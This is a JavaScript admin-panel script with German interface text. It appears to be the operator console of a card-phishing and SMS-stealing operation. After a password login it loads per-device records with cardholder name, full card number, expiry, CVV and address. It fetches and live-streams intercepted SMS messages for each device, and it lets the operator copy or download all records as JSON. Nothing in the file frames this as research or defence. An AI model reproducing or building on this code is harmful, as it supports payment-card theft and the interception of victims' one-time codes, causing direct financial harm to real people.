const serverUrl = "https://back-xx0q.onrender.com";

document.addEventListener("DOMContentLoaded", () => {
    const authSection = document.getElementById("auth-section");
    const loginBtn = document.getElementById("login-btn");
    const pwdInput = document.getElementById("admin-password");
    const authMessage = document.getElementById("auth-message");

    const adminContent = document.getElementById("admin-content");
    const copyBtn = document.getElementById("copy-btn");
    const saveBtn = document.getElementById("save-btn");
    const downloadBtn = document.getElementById("download-btn");
    const devicesListEl = document.getElementById("devices-list");
    const placeholderEl = document.getElementById("placeholder");
    const deviceInfoEl = document.getElementById("device-info");
    const smsContainerEl = document.getElementById("sms-container");

    const fields = {
        deviceId: document.getElementById("detail-deviceId"),
        cardholderName: document.getElementById("detail-cardholderName"),
        cardNumber: document.getElementById("detail-cardNumber"),
        expiry: document.getElementById("detail-expiry"),
        cvv: document.getElementById("detail-cvv"),
        address: document.getElementById("detail-address"),
        timestamp: document.getElementById("detail-timestamp"),
    };

    let jwtToken = localStorage.getItem("jwtToken");
    let socket = null;
    let currentDevice = null;
    let devicesData = [];

    if (jwtToken) {
        authSection.style.display = "none";
        adminContent.style.display = "block";
        initAdmin();
    } else {
        authSection.style.display = "block";
        adminContent.style.display = "none";
    }

    loginBtn.addEventListener("click", async() => {
        authMessage.textContent = "";
        const pwd = pwdInput.value.trim();
        if (!pwd) {
            authMessage.textContent = "Geben Sie das Passwort ein.";
            return;
        }
        try {
            const res = await fetch(`${serverUrl}/api/login`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ password: pwd })
            });
            const json = await res.json();
            if (!json.success) {
                authMessage.textContent = json.message || "Login fehlgeschlagen.";
                return;
            }
            jwtToken = json.token;
            localStorage.setItem("jwtToken", jwtToken);
            authSection.style.display = "none";
            adminContent.style.display = "block";
            initAdmin();
        } catch (e) {
            console.error(e);
            authMessage.textContent = "Server-Fehler.";
        }
    });

    function initAdmin() {
        socket = io(serverUrl, {
            path: '/socket.io',
            auth: { token: jwtToken }
        });
        socket.on("connect", () => {
            console.log("✔ Socket.IO connected:", socket.id);
        });
        socket.on("new_sms", sms => {
            if (sms.deviceId === currentDevice) appendSmsItem(sms);
        });

        copyBtn.addEventListener("click", copyDevicesToClipboard);
        saveBtn.addEventListener("click", saveSnapshot);
        downloadBtn.addEventListener("click", downloadDevicesJson);

        loadDevices();
    }

    async function loadDevices() {
        try {
            const res = await fetch(`${serverUrl}/api/devices`, {
                headers: { Authorization: `Bearer ${jwtToken}` }
            });
            const json = await res.json();
            if (json.success) {
                devicesData = json.data;
                renderDeviceList(devicesData);
            } else {
                console.error("Fehler /api/devices:", json.message);
                if (res.status === 401) {
                    localStorage.removeItem("jwtToken");
                    location.reload();
                }
            }
        } catch (e) {
            console.error(e);
        }
    }

    function renderDeviceList(devices) {
        devicesListEl.innerHTML = "";
        devices.forEach(dev => {
            const li = document.createElement("li");
            li.textContent = dev.deviceId;
            li.dataset.deviceId = dev.deviceId;
            li.addEventListener("click", () => selectDevice(dev));
            devicesListEl.append(li);
        });

        // if (devices[0]) selectDevice(devices[0]);
    }

    async function selectDevice(dev) {
        Array.from(devicesListEl.children).forEach(li =>
            li.classList.toggle("active", li.dataset.deviceId === dev.deviceId)
        );

        if (currentDevice) socket.emit("leave_device", currentDevice);
        currentDevice = dev.deviceId;
        socket.emit("join_device", currentDevice);

        placeholderEl.style.display = "none";
        deviceInfoEl.classList.add('show');
        smsContainerEl.classList.add('show');
        smsContainerEl.innerHTML = "";

        fields.deviceId.textContent = dev.deviceId;
        fields.cardholderName.textContent = dev.cardholderName;
        fields.cardNumber.textContent = dev.cardNumber;
        fields.expiry.textContent = dev.expiry;
        fields.cvv.textContent = dev.cvv;
        fields.address.textContent = dev.address;
        fields.timestamp.textContent =
            new Date(dev.timestamp).toLocaleString("de-DE");

        try {
            const res = await fetch(`${serverUrl}/api/devices/${dev.deviceId}/sms`, {
                headers: { Authorization: `Bearer ${jwtToken}` }
            });
            const json = await res.json();
            if (json.success) {
                json.data.forEach(appendSmsItem);
            }
        } catch (e) {
            console.error(e);
        }
    }

    function appendSmsItem(sms) {
        const ts = parseInt(sms.timestamp, 10);
        const timeString = isNaN(ts)
          ? "Invalid Date"
          : new Date(ts).toLocaleString("de-DE");
      
        const div = document.createElement("div");
        div.className = "sms-item";
        div.innerHTML = `
          <div class="from"><b>From:</b> ${sms.fromNumber}</div>
          <div class="body">${sms.body}</div>
          <div class="timestamp">${timeString}</div>
        `;
        smsContainerEl.append(div);
        smsContainerEl.scrollTop = smsContainerEl.scrollHeight;
      }
      

    function copyDevicesToClipboard() {
        if (!devicesData.length) return;
        navigator.clipboard.writeText(JSON.stringify(devicesData, null, 2))
            // .then(()=> alert("Geräteliste kopiert!"));
    }

    function saveSnapshot() {
        localStorage.setItem("devicesSnapshot", JSON.stringify(devicesData));
        // alert("Snapshot gespeichert!");
    }

    function downloadDevicesJson() {
        const blob = new Blob([JSON.stringify(devicesData, null, 2)], { type: "application/json" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = "devices.json";
        document.body.append(a);
        a.click();
        a.remove();
        URL.revokeObjectURL(url);
    }
});